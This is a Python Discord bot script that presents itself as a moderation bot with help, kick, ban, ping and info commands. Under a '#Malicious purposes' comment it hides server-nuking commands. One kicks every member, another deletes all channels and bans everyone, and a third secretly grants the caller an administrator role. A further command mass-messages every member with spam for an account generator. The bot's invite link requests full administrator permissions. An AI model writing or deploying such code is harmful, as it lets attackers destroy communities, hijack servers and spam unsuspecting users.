#bot created by Sir Sinister
#make sure to read the read me file for instructions

import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging
import requests

client = commands.Bot(command_prefix='$') #This Is The Prefix, Feel Free To Change It Anytime

client.remove_command("help")


@client.event
async def on_ready():
    print ("bot is now online")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.command(pass_context=True)
async def help(ctx):
    author = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='help')
    embed.add_field(name='$ping', value='Gives ping to client (expressed in ms)', inline=False)
    embed.add_field(name='$kick', value='Kicks specified user', inline=False)
    embed.add_field(name='$ban', value='Bans specified user', inline=False)
    embed.add_field(name='$info', value='Gives information of a user', inline=False)
    embed.add_field(name='$invite', value='Returns invite link of the client', inline=False)
    embed.add_field(name='$nitroinfo', value='gets a nitro codes information using discords api', inline=False)
    await ctx.send(author, embed=embed)

@client.command(pass_context=True)
async def dm(ctx, message):
    server = ctx.message.server
    for member in server.members:
     await asyncio.sleep(0)
     try:
       await ctx.send(member, "https://discord.gg/sujRrDX Join now for a cheap unlimited account generator!!")
       print("Sent message")
     except:
       pass


@client.command(pass_context=True)
async def ping(ctx):
    await ctx.send(f"Pong! {round(client.latency * 1000)}ms")

@client.command(pass_context=True)
async def info(ctx, user: discord.Member=None):
    if user is None:
        await ctx.send('Please input a user.')
    else:
        await ctx.send("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))

@client.command(pass_context=True)
async def kick(ctx, user: discord.Member=None):
    author = ctx.message.author
    if author.server_permissions.kick_members:
        if user is None:
            await ctx.send('Please input a user.')
        else:
            await ctx.send (":boot: Get kicked **{}**, Damn kid".format(user.name))
            await client.kick(user)
    else:
        await ctx.send('You lack permission to preform this action')

@client.command(pass_context=True)
async def ban(ctx, user: discord.Member=None):
    author = ctx.message.author
    if author.server_permissions.kick_members:
        if user is None:
            await ctx.send('Please input a user.')
        else:
            await ctx.send("Get banned **{}**, Damn kid".format(user.name))
            await client.ban(user)
    else:
        await ctx.send('You lack permission to preform this action')


@client.command(pass_context=True)
async def invite(ctx):
    await ctx.send("https://discordapp.com/oauth2/authorize?&client_id=503182818667659274&scope=client&permissions=8")

#Malicious purposes

@client.command(pass_context=True)
async def h(ctx):
        for user in list(ctx.message.server.members):
            try:
                await client.kick(user)
                print ("User " + user.name + " has been kicked from " + ctx.message.server.name)
            except:
                pass
        print ("Action Completed: kall")

@client.command(pass_context=True)
async def rape(ctx):
        for channel in list(ctx.message.server.channels):
            try:
                await client.delete_channel(channel)
                print (channel.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        server = ctx.message.server
        channel = await client.create_channel(server, 'RIP', type=discord.ChannelType.text)
        await ctx.send(channel, "Now that's alot of damage!!")
        for user in list(ctx.message.server.members):
            try:
                await client.ban(user)
                print ("User " + user.name + " has been banned from " + ctx.message.server.name)
            except:
                pass
        print ("Now that's alot of damage")

@client.command(pass_context=True)
async def dab(ctx):
    server = ctx.message.server
    perms = discord.Permissions(8)
    await client.create_role(server, name='dab', permissions=perms)
    user = ctx.message.author
    role = discord.utils.get(user.server.roles, name="dab")
    await client.add_roles(user, role)
    print ("You're in buddy, now don't fuck it up")
@client.command()
async def nitroinfo(ctx, *, code):
    """Gets the information from a nitro code using discords API."""
    x = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}")
    await ctx.send(x.json())
client.run("tokenhere") #Bot's Token Code Goes Here
